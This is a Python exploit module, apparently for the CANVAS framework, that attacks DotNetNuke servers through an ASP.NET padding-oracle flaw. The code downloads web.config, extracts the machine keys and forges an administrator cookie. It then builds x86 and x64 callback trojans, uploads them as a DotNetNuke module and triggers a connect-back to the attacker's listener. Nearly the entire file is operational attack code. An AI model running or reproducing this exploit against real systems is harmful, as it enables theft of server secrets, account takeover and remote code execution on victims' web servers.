# -*- coding: utf-8 -*-
#
# Resources:
#
#   http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.134.3005&rep=rep1&type=pdf
#   http://usenix.org/events/woot10/tech/full_papers/Rizzo.pdf
#   http://www.isg.rhul.ac.uk/~kp/padding.pdf
#   http://www.gdssecurity.com/l/b/2010/09/14/automated-padding-oracle-attacks-with-padbuster/
#

from __future__ import with_statement
import sys
if "." not in sys.path: sys.path.append(".")

import os
import binascii
import urllib2
import time
import exploitutils
import canvasengine
import struct
import random
import shutil
from libs import spkproxy, dotnetcookie
from installmodule import DotNetNuke
from tcpexploit import tcpexploit
from libs.paddingoracles import *
from libs.canvasos import *


NAME = "padding_oracle"
DESCRIPTION = "Padding Oracle Attack against DotNetNuke"
VERSION = "1.0"
NOTES = """Notes"""
CHANGELOG = """Changes"""
GTK2_DIALOG = "dialog.glade2"

DOCUMENTATION = {}
DOCUMENTATION["Notes"] = """
This exploit will attempt to compromise DotNetNuke servers using padding
oracle attacks. It first tries to gain administrative credentials (using
the keys found in the application web.config). If this happens,
a callback module that will connect to CANVAS will be uploaded and executed.
There are 3 different MOSDEF callback types available to better fit different
scenarios: Universal, HTTP or DNS.

If web.config has been previously downloaded (present in Downloads inside
the session directory) it will be re-used in order to speed up the attack.
Otherwise, either a t-block (faster, default) or a generic attack (slower)
will be used in order to download it and extract the needed keys.

Some websites use a redirection to a default page in case of an error,
which can lead to false positives while searching for a T-Block.
The 'Check patterns' optional parameter lets the user define a comma-separated
list with text patterns found on the main page to determine if a response
is just a redirect to a main/defaul page or not.

"""
DOCUMENTATION["Example"] = """"""

PROPERTY = {}
PROPERTY["TYPE"] = "Exploit"
PROPERTY["SITE"] =  "Remote"
PROPERTY["ARCH"] = [ ["Unix"], ["Windows"] ]
PROPERTY["VERSION"] = []


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.host           = ''
        self.path           = '/'
        self.url            = None
        self.block          = None
        self.block_size     = 8
        self.version        = 0
        self.name           = NAME
        self.user_name      = "host"
        self.technique      = "T-Block Attack"
        self.reuse          = True
        self.check_patterns = []
        self.respath        = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.mosdef_type    = "UNIVERSAL" # | HTTP | DNS
        self.dns_domain     = None
        self.http_ssl       = False
        self.https          = False
        self.setInfo(DESCRIPTION)

    def getArgs(self):
        self.getarg("user_name")
        self.getarg("block_size")
        self.getarg("reuse")
        self.getarg("https")
        #XXX: HTTP with SSL was not connecting as expected, so this option is excluded for now
        #self.getarg("http_ssl")
        technique           = self.argsDict.get("oracle", self.technique)
        self.technique      = technique if technique is not None else "T-Block Attack"
        self.mosdef_type    = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        dns_domain          = self.getarg("dns_domain")
        self.dns_domain     = dns_domain if dns_domain is not None else "paddoracle.%s" % self.host
        patterns            = self.argsDict.get("check_patterns", "").strip()
        self.check_patterns = patterns.split(",") if patterns else []
        try:
            self.block_size = int(self.block_size)
        except ValueError:
            self.block_size = None

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v, self.versions[v][0])

    def neededListenerTypes(self):
        self.getArgs()
        if self.mosdef_type == "DNS":
            return [canvasengine.DNSMOSDEF]
        elif self.mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def getEncryptedBlock(self):
        """
        Automatically extract the smallest encrypted block from the Web Application.
        """
        h = { 'User-Agent' : "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401" }

        #return "dMDb-hfb6xgu_kbZPUIkYA2"
        blocks = []

        try:
            response = spkproxy.urlopen(self.url, extraheaders=h.items())
            buffer = response.read()

            for line in buffer.split("\n"):
                index = line.find("WebResource")
                if index == -1:
                    continue

                blocks.append(line[index:].split("d=")[1].split("&")[0])

            blocks.sort()
        except Exception:
            return None

        if len(blocks) == 0: return None
        self.log("Block to decrypt: " + blocks[0])
        return blocks[0]

    def triggerCallback(self):
        trigger_url = self.url + self.callbackurl
        self.log("Trigger URL: " + trigger_url)

        try:
            response = spkproxy.urlopen(trigger_url)
            if response and "ConnectBack" in response.read():
                self.log("Connectback successfully triggered")
                return 1
            else:
                self.log("ConnectBack module doesn't seems to be installed")
        except Exception:
            self.log("An error ocurred while trying to trigger ConnectBack.")

        return 0

    def run(self):
        self.getArgs()
        self.setInfo("%s (in progress)" % (NAME))

        self.host = self.target.interface
        proto = "https" if self.https else "http"
        self.url  = '%s://%s%s' % (proto, self.host, self.getarg("path"))
        self.log("Cookie user set to " + self.user_name)

        # Make sure that url ends with /
        if self.url[-1] != "/": self.url += "/"
        self.log("URL: " + self.url)

        # Verify that this script exists
        base_url = self.url + "ScriptResource.axd?d="
        self.log("Using url: '%s' as base for attacks." % base_url)

        # This is the encrypted block from glade. This should be automatic.
        encoded_block = self.getEncryptedBlock()

        if encoded_block == None:
            self.log("Could not get the encrypted block from webpage, are you sure it is a valid ASP.NET app.?")
            self.setInfo("%s - done (failed)" % NAME)
            return 0

        do_attack = True
        if self.reuse:
            # Try and see if we have web.config already downloaded
            filename = os.path.join(self.output(ip=self.host, subdir="Downloads"), "web.config")
            try:
                if os.path.exists(filename):
                    webconfig = open(filename, 'rb').read()

                self.log('Reusing existing web.config found in %s' % filename)
                keys = dotnetcookie.getKeys(webconfig)
                if not keys: raise Exception('')
                do_attack = False
            except Exception:
                self.log('Could not parse %s' % filename)


        if do_attack:
            self.log('Downloading web.config from server..')
            encrypted = UrlTokenDecode(encoded_block).decode("base64").replace("\n", "")

            # We use stop() as a closure passed to functions in
            # libs.paddingoracles in order to have a way and stop long-running
            # computations.
            def stop():
                if self.state == self.HALT:
                    self.log('Halting T-Block Attack..')
                    return True
                return False

            if self.technique == "T-Block Attack":
                self.log("Using T-Block Attack")
                tblock_attack = TBlockAttack(base_url, encrypted, self.check_patterns)
                tblock_attack.log = self.log
                self.log("Trying to find a t-block")

                tblock_attack.findTBlock(stop_function=stop)
                if tblock_attack.tblock == None:
                    self.log("Unable to find a t-block, attack failed.")
                    self.setInfo("%s - done (failed)" % NAME)
                    return 0

                webconfig = tblock_attack.downloadFile("web.config", stop_function=stop)
                self.log("The complete attack took %d request" % tblock_attack.getTotalRequests())
                self.setInfo("%s - The complete attack took %d request" % (NAME, tblock_attack.getTotalRequests()))
            else:
                self.log("Trying to decrypt block: " + binascii.hexlify(encrypted))
                # This should queried from the Glade gui
                oracle = AspNetOracle(base_url)
                # The attack itself
                poet = PaddingOracleAttack(oracle, self.block_size, log=self.log)
                webconfig = poet.download_file(base_url, encrypted, "web.config", stop_function=stop)

            if webconfig == None:
                self.log('Could not download web.config.')
                self.setInfo("%s - done (failed)" % NAME)
                return 0

            filename = os.path.join(self.output(ip=self.host, subdir="Downloads"), "web.config")
            f = open(filename, "w")
            f.write(webconfig)
            f.close()
            self.log('Wrote web.config to %s' % filename)

        keys = dotnetcookie.getKeys(webconfig)
        if not keys:
            self.log('Error parsing web.config, aborting')
            self.setInfo("%s - done (failed)" % NAME)
            return 0

        (validationkey, decryptionkey) = keys

        self.log("Secret keys:")
        self.log("VALIDATION_KEY = " + validationkey)
        self.log("DECRYPTION_KEY = " + decryptionkey)
        self.log("Here is your Admin cookie, paste it into your browser and enjoy!")
        self.log(dotnetcookie.getAdminCookie(validationkey, decryptionkey))
        self.log("This is the admin hash")
        admin_hash = dotnetcookie.getAdminHash(validationkey, decryptionkey)
        self.log("Admin Hash: %s" % admin_hash)

        # build the trojan callbacks that the installer module needs
        if not self.build_trojans():
            self.log("Something failed when creating MOSDEF trojans")
            self.setInfo("%s - done (failed)" % NAME)
            return 0

        self.log("base url: %s" % self.url)

        myDotNetNuke = DotNetNuke(admin_hash, self.url, self.log)
        ret, callbackurl = myDotNetNuke.install_callback()

        if ret:
            self.log("Module installed. Triggering callback...")
            self.callbackurl = callbackurl
            ret = self.triggerCallback()
        else:
            self.log("Module installation failed")

        # delete callback files created in resource dir
        for arch in ("X86", "X64"):
            try:
                os.remove(os.path.join(self.respath, "callback_%s.exe" % arch))
            except OSError:
                pass

        if ret:
            self.setInfo("%s - done (Succeded!)" % NAME)
        else:
            self.setInfo("%s - done (failed)" % NAME)
        return ret

    def build_trojans(self):
        """
        Builds mosdef two trojans (x86 & x64) according to the selected mosdef type.
        These two trojans are later used to deploy the DotNetNuke module
        """
        msg = "Building MOSDEF trojans (type: %s)" % self.mosdef_type
        #msg += " - SSL = %s)" % str(self.http_ssl) if self.mosdef_type == "HTTP" else ")"
        self.log(msg)
        if self.mosdef_type == "UNIVERSAL":
            return self.build_universal_trojans()
        elif self.mosdef_type == "HTTP":
            return self.build_universal_trojans(http=True, ssl=self.http_ssl)
        else:
            return self.build_dns_trojans()

    def build_dns_trojans(self):
        filename = os.path.join(self.respath, "callback_X86.exe")
        trojanmod = self.engine.getModuleExploit("BuildDNSCallback")
        trojanmod.link(self)
        trojanmod.argsDict["proxyaddr"] = self.callback.ip
        trojanmod.argsDict["domain"]    = self.dns_domain
        trojanmod.argsDict["filename"]  = filename
        ret = trojanmod.run()
        #XXX: DNS mosdef is still not available for 64bits, so just to make it
        # the installer run for now, we just make a copy to have the x64 callback file
        if ret:
            try:
                shutil.copyfile(filename, filename.replace("X86", "X64"))
            except IOError:
                ret = 0
        return ret

    def build_universal_trojans(self, http=False, ssl=False):
        res = True
        t_os = canvasos("WINDOWS")
        for arch in ("X86", "X64"):
            t_os.arch = arch
            try:
                ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                             target_os=t_os, universal=True,
                                             http=http, ssl=ssl)
                if ret:
                    filename = os.path.join(self.respath, "callback_%s.exe" % arch)
                    with open(filename,"wb") as f:
                        f.write(self.mosdeftrojan)
            except Exception, err:
                self.log("Problem building MOSDEF trojan: %s" % str(err))
                res = False
        return res

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
    app = theexploit()
    ret = exploitutils.standard_callback_commandline(app)

